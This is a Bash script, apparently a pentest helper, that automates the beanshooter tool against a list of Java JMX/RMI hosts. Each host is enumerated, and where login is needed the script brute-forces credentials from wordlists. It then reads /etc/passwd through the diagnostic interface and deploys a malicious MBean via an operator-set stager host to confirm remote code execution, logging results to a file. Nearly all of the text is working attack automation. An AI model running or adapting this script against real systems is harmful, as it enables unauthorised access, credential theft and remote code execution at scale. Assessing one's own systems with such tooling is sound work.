# Set the correct Jar file name
Beanshooter="YOUR_BEANSHOOTER"
# Set Stager IP and Port
Stager_IP="YOUR_IP"
Stager_Port="YOUR_Port"
# User and Password wordlist
user_file="user.txt"
password_file="password.txt"


# For color printing
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

> result_Java_JMX.txt
echo "IP|Port|Service status|Auth status|Cred status|Read file|Upload MBeans" >> result_Java_JMX.txt

while read line
do
    # Flags
    service_status=""
    auth_status=""
    cred_status=""
    read_file=""
    upload_mbeans=""

    IP=`echo $line | grep -E -o ^"([0-9]{1,3}\.){3}[0-9]{1,3}"`
    Port=`echo $line | grep -E -o "[0-9]{1,10}"$`
    echo -e "${YELLOW}[+] ${GREEN}Check host $IP $Port ${NC}"

    enum_beanshooter=`./$Beanshooter enum $IP $Port --follow --no-color 2>&1`
    case $enum_beanshooter in
        *"Remote MBean server does not require authentication"*)
            echo -e "${RED}\t[!] Available without authentication${NC}"
            service_status="JMX work"
            auth_status="Without authentication"

            # Arbitrary file read check
            echo -e "${YELLOW}\t[!] Arbitrary file read check${NC}"
            read_etc_passwd=`./$Beanshooter diagnostic read $IP $Port /etc/passwd 2>&1`
			case $read_etc_passwd in
				*"root"*)
					read_file="Available"
                    echo -e "${RED}\t[!] Arbitrary reading of files is available${NC}"
                    ;;
                *"does not exist on the endpoint"*)
					read_file="Required method not found"
					echo -e "${GREEN}\t[!] Required method not found${NC}"
                	;;  
				*"Insufficient permissions"*)
					read_file="Insufficient permissions"
					echo -e "${GREEN}\t[!] Insufficient permissions${NC}"
 					;;
				*)
					echo -e "${YELLOW}\t[!] Something Wrong${NC}"
 					read_file="Something Wrong"
					;;
			esac
            
            
            # Malicious MBean upload check
            echo -e "${YELLOW}\t[!] Malicious MBean upload check${NC}"
            upload_tonka=`./$Beanshooter tonka deploy $IP $Port --no-color --stager-url http://$Stager_IP:$Stager_Port --no-stager 2>&1`
			case $upload_tonka in
				*"successfully deployed"* | *"already deployed"*)
					upload_mbeans="Vulnerable to RCE"
                    echo -e "${RED}\t[!] Successfully deployed. Vulnerable to RCE${NC}"
                    ./$Beanshooter tonka undeploy $IP $Port --no-color 2>&1 >/dev/null
                    ;;
				*"insufficient permission"*)
					read_file="Insufficient permissions"
					echo -e "${GREEN}\t[!] Insufficient permissions${NC}"
 					;;
				*)
					echo -e "${YELLOW}\t[!] Something Wrong${NC}"
 					upload_mbeans="Something Wrong"
					;;
			esac
            ;;
            
        *"Remote MBean server requires authentication"*)
            echo -e "${GREEN}\t[+] Authentication required${NC}"
            service_status="JMX work"
            auth_status="Authentication required"
            
            echo -e "${YELLOW}\t[!] Start brute force${NC}"
            credentials=`./$Beanshooter brute $IP $Port --follow --no-color --username-file $user_file --password-file $password_file 2>&1 | grep -o "Found valid credentials.*"`
            if [[ $? -eq 0 ]]
            then
            	credentials=`echo "$credentials" | sed "s/Found valid credentials: //g"`
                while IFS= read -r cred
				do
                    echo -e "${RED}\t[!] Find credentials: ${YELLOW}$cred${NC}"
                    cred_status=$cred
                    
                    # Arbitrary file read check
            		echo -e "${YELLOW}\t\t[!] Arbitrary file read check${NC}"
                    user=`echo $cred | cut -d':' -f1`
                    pass=`echo $cred | cut -d':' -f2`
                    read_etc_passwd=`./$Beanshooter diagnostic read $IP $Port /etc/passwd --username $user --password $pass 2>&1`
                    case $read_etc_passwd in
                        *"root"*)
                            read_file="Available"
                            echo -e "${RED}\t\t[!] Arbitrary reading of files is available${NC}"
                            ;;
				        *"does not exist on the endpoint"*)
							read_file="Required method not found"
							echo -e "${GREEN}\t[!] Required method not found${NC}"
				        	;;  
                        *"Insufficient permissions"*)
                            read_file="Insufficient permissions"
                            echo -e "${GREEN}\t\t[!] Insufficient permissions${NC}"
                            ;;
                        *)
                            echo -e "${YELLOW}\t\t[!] Something Wrong${NC}"
                            read_file="Something Wrong"
                            ;;
                    esac
                    
                    # Malicious MBean upload check
				    echo -e "${YELLOW}\t\t[!] Malicious MBean upload check${NC}"
				    upload_tonka=`./$Beanshooter tonka deploy $IP $Port --no-color --stager-url http://$Stager_IP:$Stager_Port --no-stager --username $user --password $pass 2>&1`
					case $upload_tonka in
						*"successfully deployed"* | *"already deployed"*)
							upload_mbeans="Vulnerable to RCE"
				            echo -e "${RED}\t\t[!] Successfully deployed. Vulnerable to RCE${NC}"
				            ./$Beanshooter tonka undeploy $IP $Port --no-color 2>&1 >/dev/null
				            ;;
                    	*"insufficient permission"*)
							upload_mbeans="Insufficient permissions"
							echo -e "${GREEN}\t\t[!] Insufficient permissions${NC}"
		 					;;
						*)
							echo -e "${YELLOW}\t\t[!] Something Wrong${NC}"
		 					upload_mbeans="Something Wrong"
							;;
					esac
                    
                    echo "$IP|$Port|$service_status|$auth_status|$cred_status|$read_file|$upload_mbeans" >> result_Java_JMX.txt
				done < <(printf '%s\n' "$credentials")
            else
                cred_status="Credentials not found"
                echo -e "${GREEN}\t[!] Credentials not found${NC}"
                echo "$IP|$Port|$service_status|$auth_status|$cred_status|$read_file|$upload_mbeans" >> result_Java_JMX.txt
            fi
            ;;
        *"Caught unexpected AuthenticationException during login attempt"*)
            echo -e "${YELLOW}\t[!] Authentication Exception${NC}"
            service_status="Dead?"
            auth_status="Dead?"
            ;;
        *"The specified endpoint is not an RMI registry"* | *"no RMI endpoint"*)
            echo -e "${YELLOW}\t[!] The specified endpoint is not an RMI registry${NC}"
            service_status="Dead?"
            auth_status="Dead?"
            ;;
        *"Target refused the connection"*)
            echo -e "${YELLOW}\t[!] Target refused the connection${NC}"
            service_status="Dead?"
            auth_status="Dead?"
            ;;
        *"The specified port is probably not an RMI service or you used a wrong TLS setting"*)
            echo -e "${YELLOW}\t[!] The specified port is probably not an RMI service or you used a wrong TLS setting${NC}"
            service_status="Dead?"
            auth_status="Dead?"
            ;;
        *)
            echo -e "${YELLOW}\t[!] Something Wrong${NC}"
            service_status="Dead?"
            auth_status="Dead?"
            ;;
    esac
	if [ "$auth_status" != "Authentication required" ]
	then
    	echo "$IP|$Port|$service_status|$auth_status|$cred_status|$read_file|$upload_mbeans" >> result_Java_JMX.txt
    fi
done < hosts.txt
